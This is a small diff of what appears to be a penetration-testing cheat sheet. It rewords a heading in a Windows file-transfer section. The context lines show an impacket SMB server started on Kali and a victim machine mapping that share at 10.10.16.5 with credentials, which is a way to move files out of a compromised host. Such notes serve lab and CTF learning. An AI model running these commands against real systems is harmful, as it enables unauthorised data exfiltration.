@@ -108,7 +108,7 @@ On kali:
 cd /tmp/datafolder
 ```
 ### Windows
-via SMB server(from victim to attacker):
+via SMB server:
 ```
 sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -username user -password pass share . -smb2support  # On kali
 net use \\10.10.16.5\share /u:user pass   # On victim
